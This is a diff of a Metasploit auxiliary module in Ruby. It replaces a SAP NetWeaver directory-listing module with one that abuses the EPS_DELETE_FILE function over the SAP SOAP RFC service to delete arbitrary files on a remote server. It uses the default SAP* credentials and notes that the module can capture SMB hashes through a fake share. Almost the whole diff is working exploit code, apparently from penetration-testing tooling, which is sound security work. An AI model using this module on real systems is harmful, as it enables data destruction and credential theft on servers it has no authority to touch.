@@ -23,7 +23,6 @@
 ##
 
 require 'msf/core'
-require 'rexml/document'
 
 class Metasploit4 < Msf::Auxiliary
 	include Msf::Exploit::Remote::HttpClient
@@ -32,49 +31,33 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name' => 'SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing',
+			'Name' => 'SAP SOAP EPS_DELETE_FILE File Deletion',
 			'Description' => %q{
-					This module exploits the SAP NetWeaver RZL_READ_DIR_LOCAL function, on the SAP
-				SOAP RFC Service, to enumerate directory contents. It returns only the first 32
-				characters of the filename since they are truncated. The module can also be used to
-				capture SMB hashes by using a fake SMB share as DIR.
+					This module abuses the SAP NetWeaver EPS_DELETE_FILE function, on the SAP SOAP
+				RFC Service, to delete arbitrary files on the remote file system. The module can
+				also be used to capture SMB hashes by using a fake SMB share as DIRNAME.
 			},
 			'References' => [
-				[ 'OSVDB', '92732'],
-				[ 'URL', 'http://erpscan.com/advisories/dsecrg-12-026-sap-netweaver-rzl_read_dir_local-missing-authorization-check-and-smb-relay-vulnerability/' ]
+				[ 'OSVDB', '74780' ],
+				[ 'URL', 'http://dsecrg.com/pages/vul/show.php?id=331' ],
+				[ 'URL', 'https://service.sap.com/sap/support/notes/1554030' ]
 			],
 			'Author' =>
 				[
-					'Alexey Tyurin', # Vulnerability discovery
+					'Alexey Sintsov', # Vulnerability discovery
 					'nmonkee' # Metasploit module
 				],
 			'License' => MSF_LICENSE
-		)
+			)
 
 		register_options([
 			Opt::RPORT(8000),
 			OptString.new('CLIENT', [true, 'SAP Client', '001']),
 			OptString.new('USERNAME', [true, 'Username', 'SAP*']),
 			OptString.new('PASSWORD', [true, 'Password', '06071992']),
-			OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])
+			OptString.new('DIRNAME', [true, 'Directory Path which contains the file to delete', '/tmp']),
+			OptString.new('FILENAME', [true, 'Filename to delete', 'msf.txt'])
 		], self.class)
-	end
-
-	def parse_xml(xml_data)
-		files = []
-		xml_doc = REXML::Document.new(xml_data)
-		xml_doc.root.each_element('//item') do |item|
-			name = size = nil
-			item.each_element do |elem|
-				name = elem.text if elem.name == "NAME"
-				size = elem.text if elem.name == "SIZE"
-				break if name and size
-			end
-			if (name and size) and not (name.empty? or size.empty?)
-				files << { "name" => name, "size" => size }
-			end
-		end
-		return files
 	end
 
 	def run_host(ip)
@@ -84,20 +67,17 @@ class Metasploit4 < Msf::Auxiliary
 		data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
 		data << '<SOAP-ENV:Header/>'
 		data << '<SOAP-ENV:Body>'
-		data << '<RZL_READ_DIR_LOCAL xmlns="urn:sap-com:document:sap:rfc:functions">'
-		data << '<FILE_TBL>'
-		data << '<item>'
-		data << '<NAME></NAME>'
-		data << '<SIZE></SIZE>'
-		data << '</item>'
-		data << '</FILE_TBL>'
-		data << '<NAME>' + datastore['DIR'] + '</NAME>'
-		data << '</RZL_READ_DIR_LOCAL>'
+		data << '<EPS_DELETE_FILE xmlns="urn:sap-com:document:sap:rfc:functions">'
+		data << '<DIR_NAME>' + datastore['DIRNAME'] + '</DIR_NAME>'
+		data << '<FILE_NAME>' + datastore['FILENAME'] + '</FILE_NAME>'
+		data << '<IV_LONG_DIR_NAME></IV_LONG_DIR_NAME>'
+		data << '<IV_LONG_FILE_NAME></IV_LONG_FILE_NAME>'
+		data << '</EPS_DELETE_FILE>'
 		data << '</SOAP-ENV:Body>'
 		data << '</SOAP-ENV:Envelope>'
 
 		begin
-			vprint_status("#{rhost}:#{rport} - Sending request to enumerate #{datastore['DIR']}")
+			vprint_status("#{rhost}:#{rport} - Sending request to delete #{datastore['FILENAME']} at #{datastore['DIRNAME']}")
 			res = send_request_cgi({
 				'uri' => '/sap/bc/soap/rfc',
 				'method' => 'POST',
@@ -113,17 +93,17 @@ class Metasploit4 < Msf::Auxiliary
 					'sap-language' => 'EN'
 				}
 			})
-			if res and res.code == 200 and res.body =~ /rfc:RZL_READ_DIR_LOCAL.Response/
-				files = parse_xml(res.body)
-				path = store_loot("sap.soap.rfc.dir", "text/xml", rhost, res.body, datastore['DIR'])
-				print_good("#{rhost}:#{rport} - #{datastore['DIR']} successfully enumerated, results stored on #{path}")
-				files.each { |f|
-					vprint_line("Entry: #{f["name"]}, Size: #{f["size"].to_i}")
-				}
+
+			if res and res.code == 200 and res.body =~ /EPS_DELETE_FILE.Response/ and res.body.include?(datastore['FILENAME']) and res.body.include?(datastore['DIRNAME'])
+				print_good("#{rhost}:#{rport} - File #{datastore['FILENAME']} at #{datastore['DIRNAME']} successfully deleted")
+			elsif res
+				vprint_error("#{rhost}:#{rport} - Response code: " + res.code.to_s)
+				vprint_error("#{rhost}:#{rport} - Response message: " + res.message.to_s)
+				vprint_error("#{rhost}:#{rport} - Response body: " + res.body.to_s) if res.body
 			end
-		rescue ::Rex::ConnectionError
-			vprint_error("#{rhost}:#{rport} - Unable to connect")
-			return
+			rescue ::Rex::ConnectionError
+				print_error("#{rhost}:#{rport} - Unable to connect")
+				return
+			end
 		end
 	end
-end
